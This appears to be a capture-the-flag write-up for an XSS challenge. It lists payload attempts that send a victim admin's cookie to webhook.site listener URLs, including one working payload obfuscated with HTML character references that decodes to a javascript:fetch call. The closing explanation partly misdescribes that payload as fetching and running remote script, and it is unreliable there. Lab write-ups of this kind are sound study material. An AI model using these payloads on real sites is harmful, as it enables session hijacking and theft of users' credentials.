# xss
https://webhook.site/2170c7c8-949c-41d1-8479-5d10a976084e
1. pressing the send button sends a post request to api.php
```html
http://ctf.adl.tw:12005/api.php?method=send
```
2. objective is to get the cookie on the server
3. iframe causes admin to send a http request to a remote link.
4. We set up a remote listener to handle http requests. We can use this [site](https://webhook.site/?fbclid=IwAR0PzMsA8CMTLpCQfhtUV38Qbh5oS-bPvotRPBz9tJCoEjsDi5j-_qM2lok#!/15777b00-a93c-4ce3-a75e-5f8afc14e2a9/26af9310-e1a9-476a-9f80-ae7d80c3823f/1).

(We may also use csp bypass.)
# payloads tried
- v1 didn't work
```html
<b onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</b>
```
- v2 (can't use onload)
```html
<iframe onload="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>
```
- v3 (can't use +)
```html
<iframe onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>
```
Turns we cannot use +
- test
```html
"/> <script>alert(0)</script> <!--
```
- v5 worked
```html
<iframe src=javascript:document.location='https://webhook.site/5b057c82-404d-4e23-a94a-c0f5d17d9259/?flag='.concat(document.cookie)>
```
- v6 also worked, generated by ./generate_payload.py
```html
<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#102;&#101;&#116;&#99;&#104;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#101;&#98;&#104;&#111;&#111;&#107;&#46;&#115;&#105;&#116;&#101;&#47;&#50;&#49;&#55;&#48;&#99;&#55;&#99;&#56;&#45;&#57;&#52;&#57;&#99;&#45;&#52;&#49;&#100;&#49;&#45;&#56;&#52;&#55;&#57;&#45;&#53;&#100;&#49;&#48;&#97;&#57;&#55;&#54;&#48;&#56;&#52;&#101;&#63;&#102;&#108;&#97;&#103;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#46;&#116;&#104;&#101;&#110;&#40;&#40;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#41;&#32;&#61;&#62;&#32;&#123;&#114;&#101;&#116;&#117;&#114;&#110;&#32;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#46;&#106;&#115;&#111;&#110;&#40;&#41;&#59;&#125;&#41;&#46;&#99;&#97;&#116;&#99;&#104;&#40;&#40;&#101;&#114;&#114;&#111;&#114;&#41;&#32;&#61;&#62;&#32;&#123;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#39;&#110;&#111;&#39;&#41;&#59;&#125;&#41><iframe>
```
The iframe element in this code is being used to load a script from a remote URL using the src attribute.  

The URL is encoded using HTML character references, which are used to represent characters that are not part of the standard ASCII character set. For example, &#106; represents the letter "j", &#97; represents the letter "a", and so on.   

When the HTML code is parsed by a web browser, these character references are converted back into their corresponding characters, so the src attribute in this iframe element would be interpreted as a URL that begins with "javascript:fetch(...".  

The iframe element also contains a script that uses the fetch() function to retrieve data from the specified URL and then execute it as a JavaScript script. This can be a security risk, as it allows the script to potentially access and manipulate the current document and any data it contains. It's generally a good idea to avoid executing arbitrary scripts from untrusted sources in this way.